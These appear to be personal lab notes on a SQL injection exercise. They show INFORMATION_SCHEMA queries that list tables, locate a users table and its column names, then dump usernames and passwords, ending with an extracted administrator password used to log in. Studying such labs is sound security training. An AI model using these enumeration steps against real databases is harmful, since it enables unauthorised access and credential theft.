# Non Oracle database info listing

checkout sql injection cheetsheet.

In firefox: 
![[Pasted image 20211020160346.png]]

Info schema table: ![[Pasted image 20211020160603.png]]

find all table names:
<br>

```sql
select TABLE_NAME from INFORMATION_SCHEMA.TABLES
```

<br>

find users table:
table name: users_svayxx

![[Pasted image 20211020160857.png]]


find users_svayxx's all column name:
<br>

How to find one specific table's all column name ?
https://dba.stackexchange.com/questions/22362/list-all-columns-for-a-specified-table
```sql

SELECT *
  FROM information_schema.columns
 WHERE table_schema = 'your_schema'
   AND table_name   = 'your_table'
     ;
```

```sql 
SELECT COLUMN_NAME
  FROM information_schema.columns
 WHERE table_name   = 'users_svayxx'
     ;
```

column names:

- username_avwsqk
- password_utugaf


![[Pasted image 20211020161616.png]]

<br>


Get all usernames and passwords:

![[Pasted image 20211020161931.png]]
<br>


login as :     administrator       moohx4inh69gbg483ray
![[Pasted image 20211020162033.png]]